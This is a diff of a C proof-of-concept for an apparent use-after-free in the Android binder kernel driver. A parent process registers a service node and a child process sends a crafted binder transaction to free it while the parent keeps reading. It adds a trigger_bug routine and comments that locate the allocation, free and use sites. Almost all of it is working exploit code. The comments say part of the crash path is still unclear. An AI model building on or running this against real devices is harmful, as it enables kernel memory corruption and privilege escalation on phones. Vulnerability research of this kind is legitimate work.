@@ -1,5 +1,6 @@
 #include "binder.h"
 #include "utils.h"
+#include <signal.h>
 
 #define COOKIE 0x424242
 #define HANDLE 0xbeef
@@ -14,16 +15,40 @@
  * 3. 现在需要将两个进程关联，父进程创建node并将其与自身proc关联，子进程冻结父进程(也可能是父进程主动冻结自己），并从父进程的proc(target_proc)
  * 中获取node并释放
  * 4. 父进程在binder_thread_read中读取node时崩溃（此步骤还没搞清楚）
+ * 
+ * alloc: binder_transaction->binder_new_node
+ * free: binder_transaction_buffer_release
+ * use: binder_thread_read->t.buffer.target_node
  */
+ // trigger vulnerability
+ void trigger_bug(PBINDER_INFO info, uint32_t handle){
+    NEW_BINDER_OBJECT_BUILDER(bob);
+    NEW_TR_BUILDER(tb);
+    BYTE rbuffer[1024];
+    size_t rsize = 1024;
+    memset(rbuffer, 0, rsize);
+
+    bob.set_fbo_hdr_type_(&bob, BINDER_TYPE_BINDER);
+    bob.set_fbo_binder_(&bob, HANDLE);
+
+    binder_size_t offsets[] = {0};
+    tb.set_tr_target_handle_(&tb, handle);
+    tb.set_tr_cookie_(&tb, 0);
+    tb.set_tr_flags_(&tb, TF_ACCEPT_FDS);
+    tb.set_tr_data_size_(&tb, 0);
+    tb.set_tr_offsets_size_(&tb, (binder_size_t)sizeof(offsets));
+    tb.set_tr_data_ptr_offsets_(&tb, (binder_uintptr_t)offsets);
+    tb.set_tr_data_size_(&tb, sizeof(bob.obj_));
+    tb.set_tr_data_ptr_buffer_(&tb, (binder_uintptr_t)&bob.obj_);
+    
+    binder_transaction(info, rbuffer, rsize, tb.tr_);
+}
+
+// getting parent process service handle and trigger vulnerability
 void child(){
     printf("\nThis is child ppid: %d\n", getppid());
     BINDER_INFO info;
     PBINDER_INFO info_ptr = &info;
-    NEW_TR_BUILDER(tb);    
-    NEW_BINDER_OBJECT_BUILDER(bob);
-    BYTE rbuffer[1024];
-    size_t rsize = 1024;
-    memset(rbuffer, 0, 1024);
     int r = binder_open(info_ptr, 128*1024);
     if(r <= BINDER_VERSION_ERROR){
         fprintf(stderr, "binder driver open failed: %x", r);
@@ -38,18 +63,16 @@ void child(){
         puts("aapk handle is 0!\n");
         return;
     }
-    printf("aapk handle is %d\n", handle);
+    trigger_bug(info_ptr, handle);
+    binder_close(info_ptr);
 }
 
-void trigger_bug(PBINDER_INFO info){
-    NEW_BINDER_OBJECT_BUILDER(bob);
-    NEW_TR_BUILDER(tb);
-
-    tb.set_tr_target_handle_(&tb, 0);
-    tb.set_tr_cookie_(&tb, 0);
+void end(int sig){
+    exit(0);
 }
-
+// create binder node and register service
 void parent(){
+    signal(SIGINT, end);
     BINDER_INFO info;
     PBINDER_INFO info_ptr = &info;
     
@@ -61,14 +84,20 @@ void parent(){
 
     uint16_t name[] = {'c', 'o', 'm', '.', 'a', 'a', 'p', 'k'};
     size_t name_len = sizeof(name);
-    register_binder_service(info_ptr, name, name_len, COOKIE, HANDLE, 1, 2, 3, 4);
-    trigger_bug(info_ptr);
-    //CHECK(create_process(child) >= 0);
+    register_binder_service(
+        info_ptr, name, name_len, COOKIE, HANDLE, 1, 2, 3, 4);
+    //trigger_bug(info_ptr);
+    CHECK(create_process(child) >= 0);
+    BYTE rbuf[1024];
+    size_t rsize = 1024;
+    while(1){
+        memset(rbuf, 0, rsize);
+        binder_read(info_ptr, rbuf, rsize);
+    }
     getchar();
     binder_close(info_ptr);
 }
 
 int main(int argc, char* argv[]){
     parent();
-    //return create_process(virtual_client, virtual_parent);
 }
